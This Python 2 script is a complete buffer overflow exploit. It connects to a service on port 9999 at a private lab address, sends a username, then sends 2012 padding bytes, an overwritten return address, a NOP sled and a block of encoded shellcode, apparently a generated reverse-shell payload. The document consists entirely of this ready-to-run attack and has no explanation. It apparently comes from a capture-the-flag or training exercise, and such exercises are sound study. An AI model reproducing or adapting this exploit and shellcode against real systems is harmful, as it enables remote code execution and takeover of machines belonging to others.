#!/usr/bin/python 
import sys, socket

username= 'harshit'

overflow = ("\xba\xfa\xd7\xa3\x2a\xd9\xf7\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x52\x83\xe8\xfc\x31\x50\x0e\x03\xaa\xd9\x41\xdf\xb6\x0e\x07"
"\x20\x46\xcf\x68\xa8\xa3\xfe\xa8\xce\xa0\x51\x19\x84\xe4\x5d"
"\xd2\xc8\x1c\xd5\x96\xc4\x13\x5e\x1c\x33\x1a\x5f\x0d\x07\x3d"
"\xe3\x4c\x54\x9d\xda\x9e\xa9\xdc\x1b\xc2\x40\x8c\xf4\x88\xf7"
"\x20\x70\xc4\xcb\xcb\xca\xc8\x4b\x28\x9a\xeb\x7a\xff\x90\xb5"
"\x5c\xfe\x75\xce\xd4\x18\x99\xeb\xaf\x93\x69\x87\x31\x75\xa0"
"\x68\x9d\xb8\x0c\x9b\xdf\xfd\xab\x44\xaa\xf7\xcf\xf9\xad\xcc"
"\xb2\x25\x3b\xd6\x15\xad\x9b\x32\xa7\x62\x7d\xb1\xab\xcf\x09"
"\x9d\xaf\xce\xde\x96\xd4\x5b\xe1\x78\x5d\x1f\xc6\x5c\x05\xfb"
"\x67\xc5\xe3\xaa\x98\x15\x4c\x12\x3d\x5e\x61\x47\x4c\x3d\xee"
"\xa4\x7d\xbd\xee\xa2\xf6\xce\xdc\x6d\xad\x58\x6d\xe5\x6b\x9f"
"\x92\xdc\xcc\x0f\x6d\xdf\x2c\x06\xaa\x8b\x7c\x30\x1b\xb4\x16"
"\xc0\xa4\x61\xb8\x90\x0a\xda\x79\x40\xeb\x8a\x11\x8a\xe4\xf5"
"\x02\xb5\x2e\x9e\xa9\x4c\xb9\xab\x3c\x44\xe6\xc4\x3c\x58\x09"
"\x49\xc8\xbe\x43\x61\x9c\x69\xfc\x18\x85\xe1\x9d\xe5\x13\x8c"
"\x9e\x6e\x90\x71\x50\x87\xdd\x61\x05\x67\xa8\xdb\x80\x78\x06"
"\x73\x4e\xea\xcd\x83\x19\x17\x5a\xd4\x4e\xe9\x93\xb0\x62\x50"
"\x0a\xa6\x7e\x04\x75\x62\xa5\xf5\x78\x6b\x28\x41\x5f\x7b\xf4"
"\x4a\xdb\x2f\xa8\x1c\xb5\x99\x0e\xf7\x77\x73\xd9\xa4\xd1\x13"
"\x9c\x86\xe1\x65\xa1\xc2\x97\x89\x10\xbb\xe1\xb6\x9d\x2b\xe6"
"\xcf\xc3\xcb\x09\x1a\x40\xeb\xeb\x8e\xbd\x84\xb5\x5b\x7c\xc9"
"\x45\xb6\x43\xf4\xc5\x32\x3c\x03\xd5\x37\x39\x4f\x51\xa4\x33"
"\xc0\x34\xca\xe0\xe1\x1c")

shellcode = "A" * 2012 + "\xdf\x14\x50\x62" + "\x90" * 32 + overflow


try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('10.10.51.252',9999))
        s.recv(1024)
        s.recv(1024)
        s.send((username + b'\r\n'))
        s.recv(1024)
        s.send((shellcode + b'\r\n'))
        s.recv(1024)
        s.close()


except:
        print "error connecting to server"
        sys.exit()
